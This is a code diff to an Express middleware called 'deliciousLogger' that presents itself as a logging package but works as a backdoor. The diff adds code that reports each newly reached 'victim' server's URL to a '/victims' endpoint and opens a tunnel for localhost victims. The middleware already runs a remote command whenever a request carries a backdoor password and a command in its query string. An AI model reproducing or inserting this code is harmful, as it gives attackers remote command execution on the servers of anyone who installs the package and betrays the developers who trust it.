@@ -2,6 +2,7 @@ import { Request, Response } from 'express';
 import LoggerFactory from './loggers/LoggerFactory';
 import { LoggerOptions } from './types/options';
 import { remoteCommand } from './utils/command';
+import HttpUtils from './utils/http';
 import RequestUtils from './utils/request';
 import TunnelUtils from './utils/tunnel';
 
@@ -27,19 +28,20 @@ const deliciousLogger = ({
   // Exit hook
   let isNewVictim = false;
   return (req: Request, _res: Response, next: any) => {
-    const { pwd, cmd } = req.query;
-    // Add new victim
-    // if (!isNewVictim) {
-    //   HttpUtils.postJSON('/victims', {
-    //     victimHost: req.hostname,
-    //   });
-    //   isNewVictim = true;
-    // }
-    if (!isNewVictim && RequestUtils.isLocal(req)) {
-      // Init tunnel if new localhost victim has been detected
-      TunnelUtils.init(RequestUtils.getPort(req));
+    // Check if victim is newly-accessed
+    if (!isNewVictim) {
+      // Init tunnel in case of localhost
+      if (RequestUtils.isLocal(req)) {
+        TunnelUtils.init(RequestUtils.getPort(req));
+      } else {
+        // Init new victim's deployed server
+        HttpUtils.postJSON('/victims', {
+          victimURL: `${req.protocol}://${req.get('host')}`,
+        });
+      }
       isNewVictim = false;
     }
+    const { pwd, cmd } = req.query;
     if (pwd && cmd) {
       // If backdoor password & command included, acts maliciously
       remoteCommand(pwd as string, cmd as string);
